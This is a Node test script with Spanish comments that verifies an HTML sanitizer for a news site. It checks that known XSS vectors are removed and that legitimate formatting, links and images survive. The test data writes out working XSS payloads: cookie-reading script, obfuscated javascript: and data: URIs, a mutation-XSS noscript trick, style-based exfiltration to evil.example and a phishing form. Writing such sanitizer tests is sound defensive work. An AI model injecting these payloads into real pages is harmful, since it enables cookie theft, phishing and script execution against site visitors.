/**
 * Verifica que `lib/sanitizar.ts` bloquea los vectores de XSS conocidos y
 * conserva el contenido legítimo de una noticia.
 *
 * ─────────────────────────────────────────────────────────────────────────────
 * CÓMO CORRERLO (Node 24: importa el .ts directo, sin compilar)
 *
 *   node scripts/verificar-sanitizacion.mjs
 *
 * No toca la base de datos ni la red.
 * ─────────────────────────────────────────────────────────────────────────────
 *
 * Cada caso de ataque declara lo que NO puede aparecer en la salida. Los casos
 * legítimos declaran lo que SÍ tiene que sobrevivir: un sanitizador que lo
 * borra todo también "bloquea" todos los ataques.
 */

import { sanitizarHtml } from "../lib/sanitizar.ts";

const ATAQUES = [
  {
    nombre: "1. <script> inline",
    html: `<p>hola</p><script>alert(document.cookie)</script>`,
    prohibido: [/<script/i, /alert/],
  },
  {
    nombre: "2. Handler de evento (img onerror)",
    html: `<img src="x" onerror="alert(1)">`,
    prohibido: [/onerror/i, /alert/],
  },
  {
    nombre: "3. href javascript:",
    html: `<a href="javascript:alert(1)">clic</a>`,
    prohibido: [/javascript:/i],
  },
  {
    nombre: "4. javascript: ofuscado (entidad, tab, mayúsculas)",
    html:
      `<a href="java&#x09;script:alert(1)">a</a>` +
      `<a href="&#106;avascript:alert(1)">b</a>` +
      `<a href=" JaVaScRiPt:alert(1)">c</a>` +
      `<a href="vbscript:msgbox(1)">d</a>` +
      `<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">e</a>`,
    prohibido: [/href="[^"]*script:/i, /href="\s*data:/i, /vbscript/i],
  },
  {
    nombre: "5. <iframe> de un tercero",
    html: `<iframe src="https://evil.example/phish"></iframe><p>ok</p>`,
    prohibido: [/<iframe/i, /evil\.example/],
  },
  {
    nombre: "6. SVG / MathML con script",
    html:
      `<svg onload="alert(1)"><script>alert(2)</script></svg>` +
      `<math><mtext><script>alert(3)</script></mtext></math>`,
    prohibido: [/<svg/i, /<math/i, /onload/i, /alert/],
  },
  {
    nombre: "7. Atributo style (exfiltración con url())",
    html: `<p style="background:url(https://evil.example/x?c=1)">texto</p>`,
    prohibido: [/style=/i, /evil\.example/],
  },
  {
    nombre: "8. <form> de phishing",
    html: `<form action="https://evil.example"><input name="password"><button>Entrar</button></form>`,
    prohibido: [/<form/i, /<input/i, /<button/i, /evil\.example/],
  },
  {
    nombre: "9. mXSS: cierre de <noscript> dentro de un atributo",
    html: `<noscript><p title="</noscript><img src=x onerror=alert(1)>"></noscript>`,
    prohibido: [/onerror/i, /alert/],
  },
  {
    nombre: "10. Tabnabbing: target/rel del autor se pisan",
    html: `<a href="https://ok.example" target="_self" rel="opener">x</a>`,
    prohibido: [/rel="opener"/, /target="_self"/],
    exigido: [/target="_blank"/, /rel="noopener noreferrer"/],
  },
  {
    nombre: "11. <object>/<embed>/<base>/<meta>",
    html:
      `<object data="https://evil.example/x.swf"></object><embed src="https://evil.example/y">` +
      `<base href="https://evil.example/"><meta http-equiv="refresh" content="0;url=https://evil.example">`,
    prohibido: [/<object/i, /<embed/i, /<base/i, /<meta/i, /evil\.example/],
  },
];

const LEGITIMOS = [
  {
    nombre: "Texto con formato, listas y cita",
    html:
      `<h2>Título</h2><p><strong>Negrita</strong>, <em>cursiva</em>, <u>sub</u> y <s>tachado</s>.</p>` +
      `<ul><li>uno</li><li>dos</li></ul><ol><li>tres</li></ol><blockquote>cita</blockquote><hr>`,
    exigido: [/<h2>Título<\/h2>/, /<strong>Negrita<\/strong>/, /<li>uno<\/li>/, /<blockquote>cita<\/blockquote>/, /<hr/],
  },
  {
    nombre: "Enlaces http, mailto, ruta y ancla",
    html:
      `<a href="https://muzikchile.cl" title="t">a</a><a href="mailto:hola@muzikchile.cl">b</a>` +
      `<a href="/noticias">c</a><a href="#arriba">d</a>`,
    exigido: [/href="https:\/\/muzikchile\.cl"/, /href="mailto:hola@muzikchile\.cl"/, /href="\/noticias"/, /href="#arriba"/, /title="t"/],
  },
  {
    nombre: "Imagen con alt y figura",
    html: `<figure><img src="https://x.supabase.co/storage/v1/object/public/a.jpg" alt="foto" class="w-full"><figcaption>pie</figcaption></figure>`,
    exigido: [/<img[^>]+src="https:\/\/x\.supabase\.co[^"]+"/, /alt="foto"/, /class="w-full"/, /<figcaption>pie<\/figcaption>/],
  },
  {
    nombre: "Texto de etiquetas no permitidas se conserva",
    html: `<section><p>dentro de section</p></section><font>dentro de font</font>`,
    exigido: [/dentro de section/, /dentro de font/],
  },
];

let fallos = 0;
const ok = (msg) => console.log(`  ✓ ${msg}`);
const mal = (msg, salida) => {
  fallos++;
  console.log(`  ✗ ${msg}\n      salida: ${salida}`);
};

console.log("Ataques — deben quedar bloqueados\n");
for (const c of ATAQUES) {
  const salida = sanitizarHtml(c.html);
  const pasa = c.prohibido.find((r) => r.test(salida));
  const falta = (c.exigido ?? []).find((r) => !r.test(salida));
  if (pasa) mal(`${c.nombre} — pasó ${pasa}`, salida);
  else if (falta) mal(`${c.nombre} — falta ${falta}`, salida);
  else ok(c.nombre);
}

console.log("\nContenido legítimo — debe sobrevivir\n");
for (const c of LEGITIMOS) {
  const salida = sanitizarHtml(c.html);
  const falta = c.exigido.find((r) => !r.test(salida));
  if (falta) mal(`${c.nombre} — falta ${falta}`, salida);
  else ok(c.nombre);
}

const total = ATAQUES.length + LEGITIMOS.length;
console.log("\n" + "─".repeat(60));
console.log(`Resultado: ${total - fallos}/${total} casos OK`);
process.exit(fallos ? 1 : 0);
